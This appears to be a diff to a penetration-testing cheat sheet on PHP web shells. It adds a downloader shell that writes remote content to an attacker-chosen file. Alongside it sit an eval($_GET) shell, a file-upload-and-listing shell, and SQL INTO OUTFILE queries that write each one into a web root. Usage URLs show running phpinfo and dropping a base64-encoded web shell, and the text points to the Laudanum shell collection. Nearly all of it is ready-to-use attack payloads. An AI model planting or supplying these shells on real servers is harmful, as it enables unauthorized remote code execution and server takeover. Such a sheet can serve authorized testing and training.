@@ -129,7 +129,19 @@ SELECT '<?php if(isset($_POST[\'submit\'])){$t=\'./\';$f=$t.basename($_FILES[\'f
 <!DOCTYPE html><html><head><title>File Upload</title></head><body><form enctype="multipart/form-data" method="POST">File: <input name="file" type="file"><br><input type="submit" value="Upload"></form><?php if (!empty($_FILES["file"])) {$file = $_FILES["file"];if ($file["error"] > 0) {echo "Error: {$file['error']}<br>";} else {echo "Stored file: {$file['name']}<br>Size: " . ($file["size"] / 1024) . " kB<br>";move_uploaded_file($file["tmp_name"], $file["name"]);}$dirArray = array_filter(scandir("."), function($entry) { return $entry[0] !== "."; });$indexCount = count($dirArray);echo "$indexCount files<br><table border=1 cellpadding=5 cellspacing=0 class=whitelinks><tr><th>Filename</th><th>Filetype</th><th>Filesize</th></tr>";foreach($dirArray as $entry) {echo "<tr><td><a href=\"$entry\">$entry</a></td><td>" . filetype($entry) . "</td><td>" . filesize($entry) . "</td></tr>";}echo "</table>";?></body></html>
 ```
 
-### 2.3 - Evaluate PHP Code
+### 2.3 - Downloader
+
+```php
+<?php fwrite(fopen($_GET[f], 'w'), file_get_contents($_GET[u])); ?>
+```
+
+SQL Query for reference.
+
+```sql
+SELECT '<?php fwrite(fopen($_GET[f], \'w\'), file_get_contents($_GET[u])); ?>' INTO OUTFILE '/var/www/html/downloader.php'
+```
+
+### 2.4 - Evaluate PHP Code
 
 ```php
 <?php eval($_GET[evaluate]); ?>
@@ -141,7 +153,7 @@ SQL Query for reference.
 SELECT '<?php eval($_GET[evaluate]); ?>' INTO OUTFILE '/var/www/html/eval_php.php'
 ```
 
-#### 2.3.1 - Usage
+#### 2.4.1 - Usage
 
 - Gather PHP Version
 
@@ -155,7 +167,7 @@ http[s]://<URL>//eval_php.php?evaluate=phpinfo();
 http[s]://<URL>//eval_php.php?evaluate=if(file_put_contents('webshell.php', base64_decode(<base64_encoded>))){ echo 1;} else {echo 2;}
 ```
 
-### 2.4 - Laudanum
+### 2.5 - Laudanum
 
 You can navigate to `/usr/share/laudanum` or `/usr/share/webshells` based on what pentest distro you have or you can clone it on github
 
